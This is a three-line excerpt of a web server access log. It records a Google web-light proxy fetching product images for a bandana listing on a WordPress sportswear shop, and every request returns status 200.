66.249.80.48 - - [15/Dec/2019:11:26:13 +0100] "GET /wp-content/uploads/2018/05/cif-g221-2-300x300.jpg HTTP/1.1" 200 8294 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:13 +0100] "GET /wp-content/uploads/2018/05/bandanaBuff.jpg HTTP/1.1" 200 20393 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/uploads/2018/05/bandanaBuff_comoqueda.jpg HTTP/1.1" 200 5936 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
